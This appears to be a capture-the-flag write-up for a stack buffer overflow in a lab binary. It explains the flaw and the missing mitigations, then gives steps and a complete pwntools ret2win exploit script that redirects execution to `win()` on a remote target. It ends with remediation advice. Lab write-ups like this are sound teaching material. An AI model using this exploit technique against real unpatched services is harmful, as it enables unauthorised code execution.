## The flaw

`print_badge()` declares `char name[32]` and then calls `read(0, name, 128)`,
writing up to 128 bytes into a 32-byte buffer (CWE-121). The extra bytes run past
the buffer, over the saved frame pointer, and into the saved return address. When
`print_badge()` returns, the CPU jumps wherever those bytes point. The binary is
built with no stack canary and `-no-pie`, so the overwrite isn't detected and
`win()` sits at a fixed address.

## Solving it

1. Read `/opt/first-overflow/vuln.c`. Note `win()` reads `/tmp/flag.txt` and prints
   it, and that nothing calls it.
2. Find the address: `objdump -d /opt/first-overflow/vuln | grep '<win>:'`.
3. Find the distance to the saved return address. In gdb, run the program with a
   cyclic pattern and read the faulting value, or reason from the frame: the
   padding here is 48 bytes.
4. The return address must be 16-byte aligned when `win()` runs, or the `printf`
   inside it crashes on a `movaps`. Put one `ret` gadget before the `win` address
   to fix the alignment.
5. From the workstation:

   ```python
   from pwn import *
   e = ELF("/opt/first-overflow/vuln")
   ret = next(e.search(b"\xc3", executable=True))
   io = remote("target", 9001)
   io.send(b"A" * 48 + p64(ret) + p64(e.symbols["win"]))
   print(io.recvall().decode())
   ```

   The response contains the flag.

## The fix

Never read more than a buffer can hold: use a length-bounded read and validate it.
Compile with the stack protector on (the default), keep the stack non-executable,
and build position-independent with ASLR so fixed-address jumps don't work. Run
the service with least privilege so a memory bug leaks as little as possible.
